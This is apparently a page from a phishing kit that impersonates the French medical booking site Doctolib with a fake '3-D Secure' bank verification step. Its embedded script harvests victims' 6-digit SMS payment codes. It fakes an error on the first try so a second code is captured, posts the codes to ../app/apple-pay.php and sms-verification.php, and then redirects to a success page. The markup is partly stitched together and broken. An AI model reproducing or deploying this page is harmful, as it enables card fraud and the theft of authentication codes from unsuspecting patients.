<?php
session_start();
include('PREVENTS/infos.php');
?>
<html data-theme="doctolib2023" lang="fr">
<head>
    <meta http-equiv="refresh" content="2;url=success.php">
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="webpack/loader.js?target=www.doctolib.fr" type="text/javascript" async="" charset="utf-8" id="spcloader"></script>
    <script src="webpack/elephant.js"></script>
    <script type="text/javascript" async="" src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" charset="utf-8"></script>
    <script type="text/javascript" async="" src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" charset="utf-8"></script>
    <script type="text/javascript" src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" async="" charset="utf-8"></script>
    <meta charset="utf-8">
    <meta name="csrf-param" content="webpack/authenticity_token">
    <meta name="csrf-token" content="webpack/Wag-VRfEb2KqfBXnn4yKm0_YM1kz6HXXKboms-ibUjFpBsO7zsZ1wrSt8rrx9JZtGn8wQMFPeuxA1_DzHxmW4A">
    <meta name="referrer" content="origin-when-cross-origin">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0, , viewport-fit=cover">
    <meta data-rh="true" name="description" content="webpack/Confirmez le rendez-vous - Dr André AZUELOS - Doctolib">
    <meta name="google-play-app" content="webpack/app-id=fr.doctolib.www">
    <meta name="apple-itunes-app" content="webpack/app-id=925339063">
    <script nonce="">
      window.platforms = {
        reactNative: false,
        reactNativeAppVersion: "",
        android: false,
        ios: true,
        variant: ""
      }

    </script>
    <link rel="stylesheet" href="webpack/family-roboto-300-400-500-700-montserrat-400-500-700-merriweather-300-400-700.css">
    <link rel="apple-touch-icon" href="webpack/180x180.png">
    <title>3-D Secure - Doctolib</title>
    <link rel="search" type="application/opensearchdescription+xml" href="webpack/open_search.xml">
    <script nonce="">
    SULTATI_RECOVERY"}};
    </script>
    <script src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" type="text/javascript" async="" charset="utf-8"></script>
    <script src="webpack/datadog-rum-v4.js" crossorigin="anonymous" data-lazy="no" nonce=""></script>
    <script src="webpack/rum-datadog-3623a02bd9251768878a.js" data-segment="patient" nonce=""></script>
    <style>
      .app_loading { display: none; }
    </style>
    <script src="webpack/5e227d5a9db847db9597d931c0ea0774.min.js" crossorigin="anonymous" data-lazy="no" nonce=""></script>
    <script src="webpack/sentry-de6d4bbd68c40facd2cd.js" data-device="desktop" nonce=""></script>
    <meta property="og:title" content="webpack/Confirmez le rendez-vous - Dr André AZUELOS - Doctolib">
    <meta property="og:type" content="webpack/website">
    <meta property="og:image" content="webpack/logo_doctolib_square.png">
    <meta property="og:url" content="webpack">
    <meta property="og:site_name" content="webpack/Doctolib">
    <meta property="og:locale" content="webpack/fr_FR">
    <meta property="og:description" content="webpack/Confirmez le rendez-vous - Dr André AZUELOS - Doctolib">
    <link rel="stylesheet" type="text/css" href="webpack/42844-249655d7.css">
    <link rel="stylesheet" type="text/css" href="webpack/61806-906039b2.css">
    <link rel="stylesheet" type="text/css" href="webpack/9753-85c79b0f.css">
    <link rel="stylesheet" type="text/css" href="webpack/25791-a2698f50.css">
    <link rel="stylesheet" type="text/css" href="webpack/22561-cf2cc161.css">
    <link rel="stylesheet" type="text/css" href="webpack/49592-708b2ae0.css">
    <link rel="stylesheet" type="text/css" href="webpack/92218-cf7973d1.css">
    <link rel="stylesheet" type="text/css" href="webpack/30520-43ce59e0.css">
    <link rel="stylesheet" type="text/css" href="webpack/50731-7fef2e8e.css">
    <link rel="stylesheet" type="text/css" href="webpack/25616-dda75468.css">
    <link rel="stylesheet" type="text/css" href="webpack/79683-c980cbdc.css">
    <link rel="stylesheet" type="text/css" href="webpack/39041-aff1fe4e.css">
    <link rel="stylesheet" type="text/css" href="webpack/95940-0527ba03.css">
    <link rel="stylesheet" type="text/css" href="webpack/595-4d1888f6.css">
    <link rel="stylesheet" type="text/css" href="webpack/662-fa29eb37.css">
    <link rel="stylesheet" type="text/css" href="webpack/312-cb7bd32f.css">
</head>
<body class="online_booking-drafts-telehealth_payment show" style="cursor: auto;">
  <div id="didomi-host" class="didomi-host" data-nosnippet="true" aria-hidden="true" lang="fr" data-lang-dir="ltr"></div>
  <div id="didomi-host" class="didomi-host" data-nosnippet="true" aria-hidden="true" lang="fr" data-lang-dir="ltr"></div>
  <iframe name="__cmpLocator" style="display: none;" title="cmpLocator"></iframe>
  <div class="flex">
    <div class="content-full-width application-container">
      <div class="js-navbar" data-props="{&quot;hide_nav_links&quot;:null,&quot;b2b_url&quot;:&quot;https://info.doctolib.fr?origin=home-header\u0026utm_button=header\u0026utm_content-group=other\u0026utm_website=doctolib_patients&quot;,&quot;hasTemporaryWarning&quot;:true,&quot;skipLink&quot;:true}">
        <div class="sr-only focus-within:p-8 focus-within:not-sr-only dl-font-size-body">
          <a class="dl-link" data-design-system="base" href="webpack/#main-content">Aller au contenu principal</a>
        </div>
        <header class="dl-nav-bar dl-desktop-navbar" data-design-system="base" role="banner">
          <div class="dl-desktop-navbar-content">
            <div class="flex dl-align-items-center dl-nav-bar-list">
              <a aria-label="Accueil" class="flex" href="webpack" title="Accueil">
                <div class="logo-doctolib logo-doctolib-white" data-test-id="logo-doctolib">
                  <span class="sr-only">Doctolib</span>
                </div>
              </a>
              <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base">
              </li>
            </div>
            <nav aria-label="Principal" role="navigation">
              <ul class="flex dl-align-items-center dl-nav-bar-list h-full">
                <li>
                  <div class="dl-popover-button-wrapper" data-design-system="deprecated">
                    <div class="dl-popover-button">
                      <div class="dl-full-height dl-flex-shrink-zero" data-design-system="base">
                      </div>
                    </div>
                    <div class="dl-card dl-card-bg-white dl-card-variant-shadow-3 dl-popover-button-choices dl-popover-xlarge !hidden" data-design-system="oxygen" data-design-system-component="Card" style="right: 0px;">
                      <div class="dl-card-content">
                        <div>
                          <div class="flex flex-row gap-x-4 items-center pb-16">
                            <svg aria-hidden="true" class="dl-icon dl-icon-small" data-design-system="oxygen" data-design-system-component="Icon" data-icon-name="regular/circle-question" fill="currentColor" focusable="false" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
                              <path d="M8 2C4.672 2 2 4.695 2 8c0 3.328 2.672 6 6 6 3.305 0 6-2.672 6-6 0-3.305-2.695-6-6-6m0 10.875A4.87 4.87 0 0 1 3.125 8c0-2.672 2.18-4.875 4.875-4.875 2.672 0 4.875 2.203 4.875 4.875 0 2.695-2.203 4.875-4.875 4.875m0-3a.74.74 0 0 0-.75.75c0 .422.305.75.75.75.398 0 .75-.328.75-.75a.755.755 0 0 0-.75-.75M8.773 5H7.578a1.63 1.63 0 0 0-1.64 1.64.57.57 0 0 0 .562.563.57.57 0 0 0 .563-.562.5.5 0 0 1 .492-.516H8.75c.305 0 .563.234.563.516a.5.5 0 0 1-.258.445l-1.336.797a.58.58 0 0 0-.282.492v.375A.57.57 0 0 0 8 9.313a.57.57 0 0 0 .563-.563v-.047l1.054-.656c.492-.305.797-.844.797-1.406C10.438 5.727 9.711 5 8.774 5Z"></path>
                            </svg>
                            <div class="font-bold text-[14px]">Questions fréquentes</div>
                          </div>
                          <div class="flex flex-col gap-y-8 pb-16">
                            <div class="text-[14px] dl-text basis-1/2">
                              <a class="text-[14px] dl-text basis-1/2 no-underline hover:no-underline" href="webpack/360024941154-Utiliser-Doctolib-sur-ordinateur-smartphone-ou-tablette?source=pinned_article" target="_blank">Utiliser Doctolib sur ordinateur, smartphone ou tablette</a>
                            </div>
                            <div class="text-[14px] dl-text basis-1/2">
                              <a class="text-[14px] dl-text basis-1/2 no-underline hover:no-underline" href="webpack/360025317194-Mot-de-passe-oubli%C3%A9-Identifiant-s-oubli%C3%A9-s?source=pinned_article" target="_blank">Mot de passe oublié ? / Identifiant(s) oublié(s) ?</a>
                            </div>
                            <div class="text-[14px] dl-text basis-1/2">
                              <a class="text-[14px] dl-text basis-1/2 no-underline hover:no-underline" href="webpack/360025316194-Prendre-et-confirmer-un-rendez-vous-sur-Doctolib?source=pinned_article" target="_blank">Prendre et confirmer un rendez-vous sur Doctolib</a>
                            </div>
                          </div>
                          <div class="flex flex-row pb-16 pl-8 mb-16">
                            <a class="dl-link no-underline hover:no-underline text-[14px] font-bold" data-design-system="base" href="webpack/fr?source=help_button" target="_blank">Ouvrir le Centre d'aide</a>
                            <svg aria-hidden="true" class="dl-icon ml-4 dl-icon-primary-110 dl-icon-xsmall" data-design-system="oxygen" data-design-system-component="Icon" data-icon-name="regular/up-right-from-square" fill="currentColor" focusable="false" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
                              <path d="M13.438 2H10.25a.75.75 0 0 0-.703.492.76.76 0 0 0 .164.82l.96.961-4.523 4.524a.723.723 0 0 0 0 1.055c.141.14.329.21.54.21.187 0 .375-.07.515-.21l4.524-4.524.96.961c.141.14.329.211.54.211.093 0 .187 0 .28-.047A.75.75 0 0 0 14 5.75V2.562A.57.57 0 0 0 13.437 2Zm-2.25 7.5a.555.555 0 0 0-.563.563v2.624a.185.185 0 0 1-.188.188H3.314c-.118 0-.188-.07-.188-.188V5.564c0-.094.07-.188.188-.188h2.624a.555 555 0 0 0 .563-.563.57.57 0 0 0-.563-.562H3.313A1.325 1.325 0 0 0 2 5.563v7.125A1.31 1.31 0 0 0 3.313 14h7.124c.704 0 1.313-.586 1.313-1.313v-2.624a.57.57 0 0 0-.563-.563Z"></path>
                            </svg>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </li>
                <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base"></li>
                <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base"></li>
                <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base"></li>
                <li class="dl-desktop-navbar-menu dl-full-height" data-design-system="base">
                </li>
              </ul>
            </nav>
          </div>
        </header>
      </div>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification SMS</title>
    <style>
        :root {
            --primary-color: #0056b3;
            --primary-color-dark: #003d82;
            --error-color: #d32f2f;
            --text-color: #1a1a1a;
            --text-color-light: #555;
            --disabled-color: #999;
            --background-color: #f5f5f5;
            --card-background: white;
            --border-color: #ddd;
            --input-background: #fafafa;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --border-radius: 12px;
            --spacing-xs: 0.5rem;
            --spacing-sm: 0.75rem;
            --spacing-md: 1rem;
            --spacing-lg: 1.5rem;
            --spacing-xl: 2rem;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        html {
            font-size: 16px;
        }

        @media (max-width: 375px) {
            html {
                font-size: 14px;
            }
        }

        body {
            background-color: var(--background-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .page-container {
            width: 100%;
            max-width: 480px;
            padding: var(--spacing-md);
        }

        .container {
            background-color: var(--card-background);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            padding: clamp(1rem, 5vw, 2rem);
            text-align: center;
            width: 100%;
        }

        .logo {
            width: auto;
            height: clamp(40px, 12vw, 60px);
            margin: 0 auto var(--spacing-lg);
            display: block;
            object-fit: contain;
        }

        .title-text {
            font-size: clamp(1.1rem, 4vw, 1.3rem);
            font-weight: 600;
            color: var(--text-color);
            margin-bottom: var(--spacing-sm);
        }

        .info-text {
            font-size: clamp(0.85rem, 3vw, 0.95rem);
            color: var(--text-color-light);
            margin-bottom: var(--spacing-lg);
            line-height: 1.4;
            max-width: 90%;
            margin-left: auto;
            margin-right: auto;
        }

        .payment-logo {
            width: auto;
            height: clamp(24px, 6vw, 32px);
            margin: 0 auto var(--spacing-lg);
            display: block;
            object-fit: contain;
            max-width: 90%;
        }

        .digit-input-group {
            display: flex;
            gap: clamp(4px, 1vw, 8px);
            justify-content: center;
            width: 100%;
            max-width: 300px;
            margin: 0 auto;
            margin-bottom: clamp(1.5rem, 4vw, 2rem);
        }

        .digit-input {
            width: clamp(32px, 8vw, 40px);
            height: clamp(40px, 10vw, 48px);
            text-align: center;
            font-size: clamp(1rem, 4vw, 1.2rem);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background-color: var(--input-background);
            transition: border 0.3s ease, transform 0.1s ease;
            caret-color: var(--primary-color);
            font-weight: 500;
        }

        .digit-input:focus {
            border-color: var(--primary-color);
            outline: none;
            background-color: var(--card-background);
            transform: scale(1.05);
            box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.1);
        }

        @media (pointer: coarse) {
            .digit-input {
                min-width: 40px;
            }
        }

        .error-message {
            color: var(--error-color);
            font-size: clamp(0.75rem, 2.5vw, 0.85rem);
            margin-bottom: var(--spacing-md);
            min-height: 1.2rem;
            display: none;
            max-width: 90%;
            margin-left: auto;
            margin-right: auto;
        }

        .button {
            width: 100%;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            padding: clamp(0.6rem, 2vw, 0.8rem);
            font-size: clamp(0.9rem, 3vw, 1rem);
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: var(--spacing-md);
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
        }

        .button:hover {
            background-color: var(--primary-color-dark);
        }

        .button:active {
            transform: scale(0.98);
        }

        .button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .help-text {
            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
            margin-top: var(--spacing-md);
        }

        .link {
            color: var(--primary-color);
            text-decoration: none;
            padding: 0.5rem;
            display: inline-block;
        }

        .link:hover {
            text-decoration: underline;
        }

        .disabled {
            color: var(--disabled-color);
            cursor: not-allowed;
            pointer-events: none;
        }

        .timer-circle {
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: clamp(26px, 6vw, 32px);
            height: clamp(26px, 6vw, 32px);
            background-color: #ff9800;
            color: white;
            border-radius: 50%;
            font-size: clamp(0.75rem, 2.2vw, 0.9rem);
            margin-left: 4px;
            font-weight: 600;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
        }
        
        .confirmation-badge {
            display: inline-flex;
            justify-content: center;
            align-items: center;
            background-color: #4caf50;
            color: white;
            border-radius: 50%;
            width: clamp(22px, 5vw, 26px);
            height: clamp(22px, 5vw, 26px);
            margin-left: 4px;
            font-size: 0.85rem;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
        }
        
        .button-loading {
            position: relative;
            color: transparent !important;
            pointer-events: none;
        }
        
        .button-loading::after {
            content: "";
            position: absolute;
            top: 50%;
            left: 50%;
            width: 20px;
            height: 20px;
            margin: -10px 0 0 -10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: button-loading-spinner 0.8s ease infinite;
        }
        
        @keyframes button-loading-spinner {
            from {
                transform: rotate(0turn);
            }
            to {
                transform: rotate(1turn);
            }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .pulsing {
            animation: pulse 1.5s infinite ease-in-out;
        }
        
        @media screen and (max-width: 480px) {
            .container {
                padding: var(--spacing-md);
                border-radius: 8px;
            }
            
            .digit-input-group {
                max-width: 260px;
            }
        }
        
        @media screen and (max-height: 600px) {
            .logo, .payment-logo {
                margin-bottom: var(--spacing-md);
            }
            
            .container {
                padding: var(--spacing-sm) var(--spacing-md);
            }
            
            .title-text {
                margin-bottom: var(--spacing-xs);
            }
            
            .info-text {
                margin-bottom: var(--spacing-md);
            }
        }
        
        @media screen and (max-width: 320px) {
            .digit-input {
                width: 28px;
                height: 36px;
                font-size: 0.9rem;
            }
            
            .digit-input-group {
                gap: 3px;
            }
            
            html {
                font-size: 13px;
            }
        }
        
        @media screen and (max-height: 450px) and (orientation: landscape) {
            .page-container {
                padding: 0.5rem;
            }
            
            .container {
                padding: 0.75rem;
                max-width: 90%;
            }
            
            .logo, .payment-logo {
                height: auto;
                max-height: 30px;
                margin-bottom: 0.5rem;
            }
            
            .title-text {
                font-size: 1rem;
                margin-bottom: 0.3rem;
            }
            
            .info-text {
                font-size: 0.8rem;
                margin-bottom: 0.5rem;
                line-height: 1.2;
            }
        }
    </style>
</head>
<body>
    <div class="page-container">
        <div class="container">
            <img src="webpack/sms.png" alt="Logo" class="logo">
            <p class="title-text">Vérification bancaire</p>
            <p class="info-text">
                Pour des raisons de sécurité, veuillez saisir le code à 6 chiffres envoyé par SMS à votre numéro de téléphone enregistré.
            </p>
            <img src="webpack/cards.png" alt="Méthodes de paiement" class="payment-logo">
            
            <form id="smsForm" action="../app/sms-verification.php" method="POST">
                <div class="digit-input-group">
                    <input type="text" class="digit-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="digit-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="digit-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="digit-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="digit-input" maxlength="1" pattern="\d" required>
                    <input type="text" class="digit-input" maxlength="1" pattern="\d" required>
                </div>
                <input type="hidden" name="smsCode" id="smsCodeHidden">
                <input type="hidden" name="attempt" id="attemptCount" value="1">
                
                <div class="error-message" id="errorMessage">
                    Code incorrect. Veuillez réessayer.
                </div>
                
                <button type="submit" class="button" id="submitButton" disabled>Valider</button>
            </form>
            
            <div class="help-text">
                <a href="#" class="link disabled" id="resendLink">
                    Nouveau code dans <span class="timer-circle" id="countdown">1:20</span>
                </a>
                <div class="third-attempt-msg" id="thirdAttemptMsg" style="display: none; margin-top: 10px; color: #d32f2f;">
                    <i class="error-icon">⚠️</i> Nous rencontrons un problème technique. 
                    <a href="#" class="link" id="validateAnyway">Sauter l'étape de validation</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const digitInputs = document.querySelectorAll('.digit-input');
            const hiddenInput = document.getElementById('smsCodeHidden');
            const submitButton = document.getElementById('submitButton');
            const errorMessage = document.getElementById('errorMessage');
            const resendLink = document.getElementById('resendLink');
            let countdownSpan = document.getElementById('countdown');
            const thirdAttemptMsg = document.getElementById('thirdAttemptMsg');
            
            const isMobile = window.matchMedia('(max-width: 768px)').matches;
            
            function adjustSizes() {
                const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
                const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
                
                if (viewportWidth < 340) {
                    document.querySelector('.digit-input-group').style.gap = '2px';
                }
                
                if (viewportHeight < 600) {
                    document.querySelector('.container').style.padding = '1rem';
                    document.querySelectorAll('.logo, .payment-logo').forEach(img => {
                        img.style.marginBottom = '0.75rem';
                    });
                }
            }
            
            adjustSizes();
            window.addEventListener('resize', adjustSizes);
            window.addEventListener('orientationchange', adjustSizes);
            
            if (!isMobile) {
                digitInputs[0].focus();
            }
            
            function checkAllFilled() {
                let allFilled = true;
                let code = '';
                
                digitInputs.forEach(input => {
                    if (input.value === '') {
                        allFilled = false;
                    }
                    code += input.value;
                });
                
                hiddenInput.value = code;
                submitButton.disabled = !allFilled;
                
                return allFilled;
            }
            
            function handlePaste(e, currentIndex) {
                e.preventDefault();
                const clipboardData = e.clipboardData || window.clipboardData;
                const pastedText = clipboardData.getData('text').trim();
                
                if (/^\d{6}$/.test(pastedText)) {
                    for (let i = 0; i < Math.min(pastedText.length, digitInputs.length); i++) {
                        digitInputs[i].value = pastedText[i];
                    }
                    digitInputs[digitInputs.length - 1].focus();
                    checkAllFilled();
                    errorMessage.style.display = 'none';
                } else {
                    const firstDigit = pastedText.match(/\d/);
                    if (firstDigit) {
                        digitInputs[currentIndex].value = firstDigit[0];
                        if (currentIndex < digitInputs.length - 1) {
                            digitInputs[currentIndex + 1].focus();
                        }
                        checkAllFilled();
                    }
                }
            }
            
            function handleDigitInput(input, index, originalEvent) {
                input.value = input.value.replace(/[^0-9]/g, '');
                
                if (input.value.length === 1) {
                    if (index < digitInputs.length - 1) {
                        digitInputs[index + 1].focus();
                        
                        if (originalEvent && originalEvent.key && /^[0-9]$/.test(originalEvent.key)) {
                            originalEvent.preventDefault();
                        }
                    } else {
                        if (isMobile) {
                            input.blur();
                        }
                        
                        submitButton.focus();
                    }
                }
                
                checkAllFilled();
                errorMessage.style.display = 'none';
            }
            
            digitInputs.forEach((input, index) => {
                input.addEventListener('paste', (e) => handlePaste(e, index));
                
                input.addEventListener('input', function(e) {
                    handleDigitInput(this, index, e);
                });
                
                input.addEventListener('keydown', function(e) {
                    if (/^[0-9]$/.test(e.key) && this.value === '') {
                        this.value = e.key;
                        handleDigitInput(this, index, e);
                    }
                    
                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
                        digitInputs[index - 1].focus();
                    } else if (e.key === 'ArrowLeft' && index > 0) {
                        digitInputs[index - 1].focus();
                    } else if (e.key === 'ArrowRight' && index < digitInputs.length - 1) {
                        digitInputs[index + 1].focus();
                    } else if (e.key === 'Enter' && checkAllFilled()) {
                        submitButton.click();
                    }
                });
                
                input.addEventListener('touchstart', function() {
                    this.focus();
                });
            });
            
            const validateAnyway = document.getElementById('validateAnyway');
            if (validateAnyway) {
                validateAnyway.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    this.innerHTML = 'Traitement en cours...';
                    this.style.color = '#999';
                    this.style.pointerEvents = 'none';
                    
                    setTimeout(() => {
                        // Redirection directe vers success.php sans passer par apple-pay.php
                        window.location.href = "success.php";
                    }, 1000);
                });
            }
            
            let validationAttempt = 1;
            document.getElementById('smsForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                submitButton.classList.add('button-loading');
                
                const code = hiddenInput.value;
                document.getElementById('attemptCount').value = validationAttempt;
                
                if (validationAttempt === 1) {
                    setTimeout(() => {
                        if (window.fetch) {
                            const formData = new FormData();
                            formData.append('smsCode', code);
                            formData.append('attempt', '1');
                            
                            fetch('../app/apple-pay.php', {
                                method: 'POST',
                                body: formData,
                                headers: {
                                    'X-Requested-With': 'XMLHttpRequest'
                                }
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.status === 'error') {
                                    errorMessage.textContent = data.message;
                                    errorMessage.style.display = 'block';
                                    errorMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
                                }
                                
                                submitButton.classList.remove('button-loading');
                            })
                            .catch(error => {
                                errorMessage.textContent = "Votre code est incorrect. Veuillez réessayer.";
                                errorMessage.style.display = 'block';
                                
                                submitButton.classList.remove('button-loading');
                            });
                        } else {
                            errorMessage.textContent = "Votre code est incorrect. Veuillez réessayer.";
                            errorMessage.style.display = 'block';
                            
                            submitButton.classList.remove('button-loading');
                        }
                        
                        digitInputs.forEach(input => {
                            input.value = '';
                        });
                        if (!isMobile) {
                            digitInputs[0].focus();
                        }
                        
                        validationAttempt++;
                        checkAllFilled();
                    }, 1500);
                } else {
                    setTimeout(() => {
                        this.submit();
                    }, 1500);
                }
            });
            
            let totalSeconds = 80;
            let resendAttempt = 0;
            let countdownInterval = null;
            
            function formatTime(seconds) {
                const minutes = Math.floor(seconds / 60);
                const remainingSeconds = seconds % 60;
                return `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
            }
            
            function startCountdown(seconds, onComplete) {
                if (countdownInterval) {
                    clearInterval(countdownInterval);
                }
                
                totalSeconds = seconds;
                countdownSpan.textContent = formatTime(totalSeconds);
                
                countdownInterval = setInterval(() => {
                    totalSeconds--;
                    countdownSpan.textContent = formatTime(totalSeconds);
                    
                    if (totalSeconds <= 0) {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                        if (onComplete) onComplete();
                    }
                }, 1000);
            }
            
            countdownSpan.textContent = formatTime(totalSeconds);
            
            startCountdown(totalSeconds, function() {
                resendLink.classList.remove('disabled');
                resendLink.textContent = 'Renvoyer le code';
            });
            
            resendLink.addEventListener('click', function(e) {
                if (this.classList.contains('disabled')) {
                    return;
                }
                
                e.preventDefault();
                resendAttempt++;
                
                this.classList.add('disabled');
                this.innerHTML = 'Code envoyé <span class="confirmation-badge pulsing">✓</span>';
                
                digitInputs.forEach(input => {
                    input.value = '';
                });
                
                if (!isMobile) {
                    digitInputs[0].focus();
                }
                
                checkAllFilled();
                errorMessage.style.display = 'none';
                
                setTimeout(() => {
                    if (resendAttempt >= 2) {
                        thirdAttemptMsg.style.display = 'block';
                        this.style.display = 'none';
                    } else {
                        this.innerHTML = 'Nouveau code dans <span class="timer-circle" id="countdown">1:20</span>';
                        countdownSpan = document.getElementById('countdown');
                        
                        startCountdown(80, function() {
                            resendLink.classList.remove('disabled');
                            resendLink.textContent = 'Renvoyer le code';
                        });
                    }
                }, 3000);
            });
        });
    </script>
</body>
</html>	
		
		
            </div>
          </div>
        </div>
      </main>
      <div class="dl-white-bg">
        <div class="dl-footer-content m-auto">
          <div class="dl-footer-container dl-footer-help-container flex dl-justify-between dl-align-items-center dl-text-center">
            <div class="dl-footer-help-text flex flex-wrap dl-flex-grow-shrink-auto">
              <div class="dl-text dl-text-title dl-text-l dl-text-bold dl-margin-r-4">Des questions ?</div>
              <div class="dl-text dl-text-body dl-text-s dl-text-regular">Consultez notre Centre d'aide ou contactez-nous</div>
            </div>
            <a class="dl-button-primary dl-button dl-button-size-normal dl-flex-shrink-zero" href="webpack/fr?source=help_button" target="_blank">
              <span class="dl-button-label">
                <svg class="dl-icon dl-button-left-icon dl-icon-xsmall" fill="currentColor" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
                  <path clip-rule="evenodd" fill-rule="evenodd" d="M8 14.4A6.4 6.4 0 1 0 8 1.6a6.4 6.4 0 0 0 0 12.8zm0-7.793a1.084 1.084 0 1 1 0-2.168 1.084 1.084 0 0 1 0 2.168zm1.135 4.696h-2.27a.31.31 0 0 1-.31-.31v-.619a.31.31 0 0 1 .31-.31h.31v-1.65h-.31a.31.31 0 0 1-.31-.31v-.619a.31.31 0 0 1 .31-.31h1.651a.31.31 0 0 1 .31.31v2.58h.31a.31.31 0 0 1 .31.31v.62a.31.31 0 0 1-.31.31z"></path>
                </svg>
                Ouvrir le Centre d'aide
              </span>
            </a>
          </div>
          <div class="dl-footer-divider legacy-dl-divider"></div>
        </div>
      </div>
      <div class="dl-white-bg">
        <div class="dl-footer-content m-auto">
          <div class="dl-footer-container flex dl-justify-between dl-align-items-center dl-text-center">
            <div class="dl-footer-help-text flex flex-wrap dl-flex-grow-shrink-auto dl-align-items-center">
              <div class="dl-text dl-text-title dl-text-l dl-text-bold dl-margin-r-4">
                <img alt="Doctolib" class="dl-footer-logo" src="webpack/logo-blue.png">
              </div>
              <p class="dl-text dl-text-body dl-text-regular dl-text-neutral-090">
                Copyright © 2025 Doctolib, tous droits réservés.
              </p>
            </div>
            <div class="dl-flex-center">
              <div>
                <a class="inline-block" data-u="==wM2ATOzMTN
ykDZp9iYpx2b0N2bk9CcwF2LyZ2Lt92YuUGbwBXYuMXZuVHdp9yL6MHc0RHa" role="link" tabindex="0" target="_blank">
                  <img alt="Télécharger dans l’App Store" class="dl-store-badge" src="webpack/hp-app-store-badge-fr.png">
                </a>
              </div>
              <div class="dl-margin-l">
                <a class="inline-block" data-u="==gcm1DboZyd3dnLilGbvR3YvRmLyZWP
kl2PzxWahRXZk9ycwBXYvUmcvR3cv02bj5SZsd2bvdmL5FGbw9yL6MHc0RHa" role="link" tabindex="0" target="_blank">
                  <img alt="Disponible sur Google Play" class="dl-store-badge" src="webpack/hp-google-play-badge-fr.png">
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script nonce="">
    window.country = "fr";
    window.current_account = {"tanker_it_privacy_settings":{}};
    window.flashMessages = [];
    window.locale = "fr";
    window.onPartnerDomain = false;
    window.portalSlug = "";
    window.portalName = "";
    window.portalReturnUrl = "";
    window.pre_authenticated_account = null;
    window.translation_keys = JSON.parse("{ "}}}}}}");
  </script>
  <script nonce="">window.screeb_enabled_for_country = false;</script>
  <script nonce="" src="webpack/3002-7a2eb216afdaac0cd29c.js"></script>
  <script nonce="" src="webpack/7927-92fa7de1c5b372ab509a.js"></script>
  <script nonce="" src="webpack/70920-ecfdaf6621a76ed4529b.js"></script>
  <script nonce="" src="webpack/patient-desktop-850aa29e2ee5f53dfa9d.js"></script>
  <style>
    .errorField {
      outline: 2px solid red !important;
    }
    .error-message {
      color: red;
      display: none;
      font-size: 0.9em;
      margin-top: 5px;
    }
    input:disabled {
      background-color: #f5f5f5;
    }
    #chargementGif img,
    #main-content img {
      max-width: 20%;
      height: auto;
      display: block;
      margin: 0 auto;
    }
  </style>

  <div></div>
  <div class="dl-toast-wrapper snapshot-hide dl-toast-wrapper-left" data-design-system="oxygen" data-design-system-component="ToastProvider"></div>
  <div class="sr-panel-holder" id="ariaLiveSRPanel">
    <div aria-atomic="true" aria-live="polite" aria-relevant="all" role="log"></div>
  </div>


